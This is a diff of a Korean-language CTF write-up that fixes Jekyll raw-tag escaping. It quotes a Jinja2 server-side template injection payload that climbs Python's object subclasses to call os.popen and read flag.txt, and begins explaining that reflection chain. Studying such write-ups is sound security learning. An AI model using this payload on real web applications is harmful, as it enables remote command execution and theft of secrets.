@@ -66,17 +66,17 @@ FLAG는 `./flag.txt`에서 읽어와 `app.secret_key`로 저장하고 있다.
 
 ## 3. Payload
 
-{ % raw % }
+{{ % raw % }}
 `{{"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt').read()}}`
-{ % endraw % }
+{{ % endraw % }}
 
 코드에 대해서 설명하자면
 
 ### 전체 구조
 
-{ % raw %}
+{{ % raw % }}
 `{{ ... }}`: 템플릿 코드 Jinja로 감싸기
-{ % endraw %}
+{{ % endraw % }}
 
 ### 객체 탈출(파이썬 리플렉션 체인)
 
